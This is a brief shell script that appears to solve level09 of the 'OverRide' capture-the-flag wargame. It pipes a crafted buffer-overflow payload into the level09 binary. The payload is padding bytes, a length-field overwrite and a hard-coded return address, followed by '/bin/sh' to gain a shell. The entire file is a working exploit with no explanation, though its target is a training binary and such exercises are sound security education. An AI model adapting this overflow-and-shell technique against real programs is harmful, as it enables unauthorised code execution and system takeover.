#!/bin/sh

# Works only in the usage of OverRide
# Don't forget to chmod +x this file before executing

(python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh\n"'; cat) | /home/users/level09/level09
